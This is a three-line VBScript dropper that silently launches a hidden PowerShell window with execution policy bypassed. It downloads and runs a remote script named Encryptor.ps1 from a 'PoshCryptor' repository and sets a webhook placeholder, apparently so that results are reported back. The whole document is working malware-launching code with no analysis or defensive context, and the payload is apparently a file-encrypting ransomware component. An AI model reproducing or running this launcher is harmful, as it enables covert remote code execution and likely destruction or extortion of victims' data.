Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigew0rm/PoshCryptor/main/Encryption/Encryptor.ps1 | iex", 0, True

